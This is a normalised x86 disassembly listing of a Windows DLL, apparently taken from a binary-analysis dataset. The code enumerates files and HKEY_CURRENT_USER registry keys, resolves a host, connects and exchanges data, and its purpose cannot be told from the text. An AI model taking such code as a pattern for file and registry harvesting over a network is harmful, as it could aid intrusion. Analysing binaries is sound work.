mov [ ebp - 0x4 ] 0x15
call sub_100110a9
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push [ ebp - 0x2bc ]
call [ FindClose@IAT ]
cmp [ ebp + 0xc ] esi
je r-xdata
lea ecx [ ebp - 0x48 ]
call sub_1000264e
call sub_1002b392
retn 0x8
push ebx
push esi
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x30 ] 0x8
mov eax [ ebp - 0x44 ]
jae r-xdata
dec [ ebp + 0xc ]
lea ecx [ ebp - 0x2b8 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x2bc ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x44 ]
test [ ebp - 0x2b8 ] 0x10
je r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
push [ ebp - 0x2bc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x28c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x16
call sub_1000c634
test eax eax
je r-xdata
push [ ebp - 0x2bc ]
call [ FindClose@IAT ]
push ebx
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1000c634
test eax eax
je r-xdata
push r--data
push [ ebp - 0x2dc ]
lea eax [ ebp - 0x2d8 ]
push eax
call sub_100098f3
add esp 0xc
lea ecx [ ebp - 0x28c ]
push ecx
push eax
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4 ] 0x17
call sub_100098f3
add esp 0xc
push [ ebp + 0xc ]
mov ecx edi
push eax
mov [ ebp - 0x4 ] 0x18
call sub_10011fdd
push ebx
push esi
lea ecx [ ebp - 0x64 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x2d8 ]
call sub_1000264e
sub_10012605
push 0xcc
mov eax sub_10052e5e
call sub_1002b345
mov esi ecx
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0xc0 ] esi
call sub_10001362
xor ebx ebx
inc ebx
push ebx
lea eax [ ebp - 0x78 ]
push eax
xor edi edi
mov eax esi
mov [ ebp - 0x4 ] edi
call sub_10011067
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x78 ]
call sub_1000264e
push r--data
lea ecx [ ebp - 0x94 ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] ebx
call sub_10001362
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
push 0x80000001
lea eax [ ebp - 0xbc ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push edi
push ebx
lea ecx [ ebp - 0x78 ]
call sub_1000264e
push edi
push ebx
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
mov esi r--data
push esi
lea ecx [ ebp - 0x34 ]
call sub_10001362
push ebx
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10011067
push edi
push ebx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
mov ecx [ ebp - 0xc0 ]
lea edx [ ebp - 0xbc ]
call sub_10013260
push esi
lea ecx [ ebp - 0x34 ]
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_100110a9
push edi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_1000264e
push r--data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0x4 ] 0x8
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0xbc ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10014b9d
lea esi [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] 0xa
call sub_100150ca
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0xc4 ] esi
lea esi [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x9
call sub_100150b1
push edi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x5
jmp sub_100127a3
call sub_1000af0a
mov ecx [ ebp - 0xcc ]
mov esi [ eax ]
cmp ecx edi
je r-xdata
sub_100127a3
cmp [ ebp - 0xc4 ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xbc ]
call sub_10014b74
push r--data
lea ecx [ ebp - 0x50 ]
call sub_10001362
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x1a
call sub_100110a9
push edi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
call sub_1002b3a1
retn
push edi
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x7c ] 0x7
call sub_10002630
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10013604
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0xe
call sub_1000253c
push edi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0xc
jmp sub_1001289e
sub_100127f8
mov ecx [ ebp - 0xd4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_10001ebc
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x10
call sub_10008282
mov esi eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
push 0xffffffff
xor esi esi
push esi
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000253c
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x78 ]
call sub_100020e2
mov [ ebp - 0x4 ] 0xc
mov eax r-xdata
retn
sub_1001289e
push r--data
lea ecx [ ebp - 0x50 ]
call sub_10001362
mov edi [ ebp - 0xc0 ]
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_1001113e
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
push esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x1c ] 0x7
call sub_10002630
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x14
call sub_10012a45
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x15
call sub_1000253c
push esi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x13
jmp sub_100129bc
sub_1001291a
mov ecx [ ebp - 0xd8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_10001ebc
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x17
call sub_10008282
mov esi eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
push 0xffffffff
xor esi esi
push esi
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x18
call sub_1000253c
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x78 ]
call sub_100020e2
mov [ ebp - 0x4 ] 0x13
mov eax r-xdata
retn
sub_100129bc
push r--data
lea ecx [ ebp - 0x50 ]
call sub_10001362
mov edi [ ebp - 0xc0 ]
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x19
call sub_1001113e
push esi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x34 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x94 ]
call sub_1000264e
xor edi edi
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xbc ]
call sub_10014b74
push r--data
lea ecx [ ebp - 0x50 ]
call sub_10001362
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x1a
call sub_100110a9
push edi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_1000264e
call sub_1002b3a1
retn
sub_10012a45
push 0x410
mov eax sub_10051ac7
call sub_1002b345
mov eax [ ebp + 0x8 ]
mov esi ecx
xor ebx ebx
push r--data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x35c ] eax
mov [ ebp - 0x364 ] esi
mov [ ebp - 0x360 ] ebx
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x174 ]
push eax
push esi
mov [ ebp - 0x4 ] ebx
call sub_10014b9d
lea ecx [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100150f9
lea esi [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x3
call sub_100150b1
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
mov esi r--data
push esi
call sub_1002762d
pop ecx
push eax
push esi
xor eax eax
lea ecx [ ebp - 0x6c ]
call sub_10013912
cmp eax 0xffffffff
je r-xdata
push 0x7
pop esi
push ebx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x70 ] esi
call sub_10002630
push ebx
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xe0 ] esi
call sub_10002630
push r--data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x9
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x174 ]
push eax
mov [ ebp - 0x4 ] 0xa
push [ ebp - 0x364 ]
call sub_10014b9d
lea ecx [ ebp - 0xc0 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0xb
call sub_100150f9
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xc
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0xc0 ]
call sub_1000264e
lea esi [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xa
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x9
call sub_1000264e
push r--data
lea ecx [ ebp - 0x34 ]
call sub_10001362
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x174 ]
push eax
mov [ ebp - 0x4 ] 0xd
push [ ebp - 0x364 ]
call sub_10014b9d
lea ecx [ ebp - 0xc0 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0xe
call sub_100150f9
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0xc0 ]
call sub_1000264e
lea esi [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xd
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0x34 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
push 0xffffffff
add eax 0x5
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10009533
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
mov esi r--data
push esi
call sub_1002762d
pop ecx
push eax
push esi
xor eax eax
lea ecx [ ebp - 0x6c ]
call sub_10013912
cmp eax 0xffffffff
je r-xdata
push r--data
lea ecx [ ebp - 0x190 ]
call sub_10001ebc
push r--data
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x11
call sub_10001ebc
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_100139d4
cmp [ ebp - 0x70 ] 0x8
mov eax [ ebp - 0x84 ]
jae r-xdata
push eax
push ebx
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10009533
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x6
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0xc0 ]
call sub_1000264e
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_10013ba5
pop ecx
pop ecx
neg al
sbb al al
push ebx
inc al
push edi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x358 ] al
call sub_1000264e
cmp [ ebp - 0x358 ] bl
je r-xdata
lea eax [ ebp - 0x84 ]
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x190 ]
push eax
lea eax [ ebp - 0x394 ]
push eax
call sub_10013abd
add esp 0xc
push eax
lea eax [ ebp - 0xdc ]
push eax
mov [ ebp - 0x4 ] 0x1a
call sub_10013b08
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x394 ]
mov [ ebp - 0x4 ] 0x1c
call sub_100020e2
lea eax [ ebp - 0x370 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x378 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
mov [ ebp - 0x4 ] 0x1d
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x358 ] 0x3a
cmp eax edi
jb r-xdata
lea eax [ ebp - 0x368 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x3a0 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0xc0 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
lea eax [ ebp - 0x378 ]
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x13
call sub_10007e38
mov esi eax
lea eax [ ebp - 0x370 ]
push eax
lea ecx [ ebp - 0xf8 ]
call sub_10009d44
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x1bc ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006383
push r--data
lea eax [ ebp - 0xc0 ]
push eax
lea eax [ ebp - 0x394 ]
push eax
mov [ ebp - 0x4 ] 0x14
call sub_10013a76
add esp 0xc
mov ecx esi
push ecx
push eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x15
call sub_10013abd
add esp 0xc
push ebx
push edi
lea ecx [ ebp - 0x394 ]
mov [ ebp - 0x4 ] 0x17
call sub_100020e2
cmp [ ebp - 0x1c ] 0x10
mov eax [ ebp - 0x30 ]
jae r-xdata
or edi 0xffffffff
dec eax
cmp eax 0xffffffff
jbe r-xdata
push [ ebp - 0x20 ]
lea esi [ ebp - 0x16c ]
push eax
call sub_100172e8
push r--data
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x18
call sub_10001e9f
lea eax [ ebp - 0x394 ]
push eax
mov ecx esi
call sub_1001743a
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x19
call sub_100071fd
push ebx
push edi
lea ecx [ ebp - 0x394 ]
mov [ ebp - 0x4 ] 0x18
call sub_100020e2
push r--data
lea ecx [ ebp - 0x114 ]
call sub_10013b88
mov ecx esi
call sub_10017303
push ebx
push edi
lea ecx [ ebp - 0x34 ]
call sub_100020e2
push ebx
push edi
lea ecx [ ebp - 0x1bc ]
call sub_100020e2
push ebx
push edi
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x12
call sub_100020e2
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x118 ] 0x10
mov eax [ ebp - 0x12c ]
jae r-xdata
lea ecx [ ebp - 0x148 ]
cmp [ ebp - 0x38 ] 0x10
mov esi [ ebp - 0x4c ]
jae r-xdata
or eax 0xffffffff
lea edx [ ebp - 0x360 ]
push edx
push ebx
push ecx
push eax
call [ getaddrinfo@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x12c ]
add esi eax
lea esi [ ebp - 0x4c ]
mov eax [ ebp - 0x360 ]
cmp eax ebx
jne r-xdata
push eax
lea esi [ ebp - 0x41c ]
call sub_10018f4c
push r--data
mov eax esi
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
push edi
lea eax [ ebp - 0x358 ]
push eax
push esi
call sub_10027c61
add esp 0xc
test eax eax
je r-xdata
cmp [ eax + 0x18 ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x394 ]
call sub_10001ebc
lea eax [ ebp - 0x394 ]
push eax
lea ecx [ ebp - 0x3c8 ]
mov [ ebp - 0x4 ] 0x20
call sub_10001eec
push r--data
lea eax [ ebp - 0x3c8 ]
jmp r-xdata
cmp esi eax
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
mov esi [ eax + 0x18 ]
lea edi [ ebp - 0x1a0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ freeaddrinfo@IAT ]
lea eax [ ebp - 0x354 ]
mov [ ebp - 0x360 ] ebx
call sub_10019049
lea ecx [ ebp - 0x354 ]
mov [ ebp - 0x4 ] 0x22
call sub_1001914a
lea ecx [ ebp - 0x354 ]
call sub_10019128
push 0x10
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x354 ]
call sub_10019166
cmp [ ebp - 0xc4 ] 0x10
mov eax [ ebp - 0xd8 ]
jae r-xdata
push r--data
lea ecx [ ebp - 0x394 ]
call sub_10001ebc
lea eax [ ebp - 0x394 ]
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x21
call sub_10001eec
push r--data
lea eax [ ebp - 0x3f0 ]
jmp r-xdata
push eax
call sub_1002ae74
dec esi
jmp r-xdata
sub esi eax
mov edi esi
jmp r-xdata
lea eax [ ebp - 0x4c ]
push ebx
push [ ebp - 0xc8 ]
lea ecx [ ebp - 0x354 ]
push eax
call sub_100191a4
push 0xc8
call [ Sleep@IAT ]
push ebx
push 0x400
lea ecx [ ebp - 0xa4 ]
call sub_10005cd0
mov [ ebp - 0x4 ] 0x24
cmp [ ebp - 0x8c ] 0x10
mov eax [ ebp - 0xa0 ]
jae r-xdata
lea eax [ ebp - 0xd8 ]
mov al [ ebp - 0x358 ]
cmp [ esi ] al
jne r-xdata
push edi
push ebx
lea eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x130 ]
call sub_1000b8f5
push 0xffffffff
inc edi
push edi
lea eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x14c ]
mov [ ebp - 0x4 ] 0x1e
call sub_1000b8f5
mov [ ebp - 0x4 ] 0x1f
cmp [ ebp - 0x134 ] 0x10
mov ecx [ ebp - 0x148 ]
mov [ ebp - 0x360 ] ebx
jae r-xdata
push ebx
push [ ebp - 0x90 ]
lea ecx [ ebp - 0x354 ]
push eax
call sub_100191ea
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0xa0 ]
push ebx
push eax
lea ecx [ ebp - 0xa4 ]
call sub_1000133e
lea eax [ ebp - 0x370 ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x23
call sub_10008282
mov esi eax
lea eax [ ebp - 0x378 ]
push eax
lea ecx [ ebp - 0xa4 ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
mov esi [ ebp - 0x35c ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
jmp r-xdata
mov ecx [ ebp - 0x35c ]
push r--data
call sub_10001362
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0xa4 ]
call sub_100020e2
lea ecx [ ebp - 0x354 ]
call sub_100190c8
push ebx
push esi
lea ecx [ ebp - 0x14c ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x130 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x50 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0xdc ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x114 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x190 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0xf8 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x88 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x6c ]
call sub_1000264e
mov eax [ ebp - 0x35c ]
call sub_1002b3a1
retn 0x4
sub_100131ff
mov eax [ ebp - 0x398 ]
cmp [ eax + 0x28 ] 0x274c
jne r-xdata
xor ebx ebx
push ebx
push ebx
jmp r-xdata
mov ecx [ ebp - 0x35c ]
push r--data
call sub_10001362
mov eax r-xdata
retn
call sub_1002ae74
mov eax [ ebp - 0x360 ]
cmp eax ebx
jne r-xdata
cmp [ eax + 0x18 ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x394 ]
call sub_10001ebc
lea eax [ ebp - 0x394 ]
push eax
lea ecx [ ebp - 0x3c8 ]
mov [ ebp - 0x4 ] 0x20
call sub_10001eec
push r--data
lea eax [ ebp - 0x3c8 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
lea edi [ ebp - 0x1a0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ freeaddrinfo@IAT ]
lea eax [ ebp - 0x354 ]
mov [ ebp - 0x360 ] ebx
call sub_10019049
lea ecx [ ebp - 0x354 ]
mov [ ebp - 0x4 ] 0x22
call sub_1001914a
lea ecx [ ebp - 0x354 ]
call sub_10019128
push 0x10
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x354 ]
call sub_10019166
cmp [ ebp - 0xc4 ] 0x10
mov eax [ ebp - 0xd8 ]
jae r-xdata
push r--data
lea ecx [ ebp - 0x394 ]
call sub_10001ebc
lea eax [ ebp - 0x394 ]
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x21
call sub_10001eec
push r--data
lea eax [ ebp - 0x3f0 ]
jmp r-xdata
push eax
push ebx
push [ ebp - 0xc8 ]
lea ecx [ ebp - 0x354 ]
push eax
call sub_100191a4
push 0xc8
call [ Sleep@IAT ]
push ebx
push 0x400
lea ecx [ ebp - 0xa4 ]
call sub_10005cd0
mov [ ebp - 0x4 ] 0x24
cmp [ ebp - 0x8c ] 0x10
mov eax [ ebp - 0xa0 ]
jae r-xdata
lea eax [ ebp - 0xd8 ]
push ebx
push [ ebp - 0x90 ]
lea ecx [ ebp - 0x354 ]
push eax
call sub_100191ea
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0xa0 ]
push ebx
push eax
lea ecx [ ebp - 0xa4 ]
call sub_1000133e
lea eax [ ebp - 0x370 ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x23
call sub_10008282
mov esi eax
lea eax [ ebp - 0x378 ]
push eax
lea ecx [ ebp - 0xa4 ]
call sub_10008213
push [ esi + 0x4 ]
push [ esi ]
mov esi [ ebp - 0x35c ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10006075
jmp r-xdata
mov ecx [ ebp - 0x35c ]
push r--data
call sub_10001362
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0xa4 ]
call sub_100020e2
lea ecx [ ebp - 0x354 ]
call sub_100190c8
push ebx
push esi
lea ecx [ ebp - 0x14c ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x130 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x50 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0xdc ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x114 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0x190 ]
call sub_100020e2
push ebx
push esi
lea ecx [ ebp - 0xf8 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x88 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x6c ]
call sub_1000264e
mov eax [ ebp - 0x35c ]
call sub_1002b3a1
retn 0x4
sub_1001323f
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_10013b70
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_10013260
push 0x84
mov eax sub_10052d95
call sub_1002b30f
mov edi ecx
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x48 ] edi
mov ebx edx
call sub_10001362
lea eax [ ebp - 0x64 ]
push eax
xor esi esi
mov eax ebx
mov [ ebp - 0x4 ] esi
call sub_100150de
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001113e
push esi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1000264e
push esi
push esi
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebx + 0x4 ]
call [ RegQueryInfoKeyW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
inc [ ebp - 0x40 ]
xor edi edi
cmp [ ebp - 0x44 ] esi
jbe r-xdata
push r--data
lea ecx [ ebp - 0x64 ]
call sub_10001ebc
lea eax [ ebp - 0x64 ]
push eax
mov ebx edi
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x2
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
call sub_1002b392
retn
push [ ebp - 0x3c ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x40 ]
push edi
push eax
push ebx
call sub_10014d60
mov ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x3
call sub_10013355
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x38 ]
call sub_100150b1
inc edi
cmp edi [ ebp - 0x44 ]
jb r-xdata
sub_10013355
push 0xfc
mov eax sub_10052d4d
call sub_1002b30f
mov edi ecx
mov esi edx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4c ] esi
call sub_10001362
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
push ebx
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
call sub_10011067
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x6c ]
push eax
mov eax esi
mov [ ebp - 0x4 ] ebx
call sub_100150de
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001113e
push 0x0
push ebx
lea ecx [ ebp - 0x6c ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x4 ] 0x3
mov esi [ esi ]
push eax
call sub_1000313a
push esi
lea eax [ ebp - 0x100 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1000935d
lea ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x108 ]
call sub_10003269
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001113e
push 0x0
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1000264e
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002793
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp - 0x4c ]
lea esi [ ebp - 0x50 ]
call sub_100150ca
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x50 ]
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x4c ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
call sub_1001743a
pop ecx
lea eax [ ebp - 0x7c ]
push eax
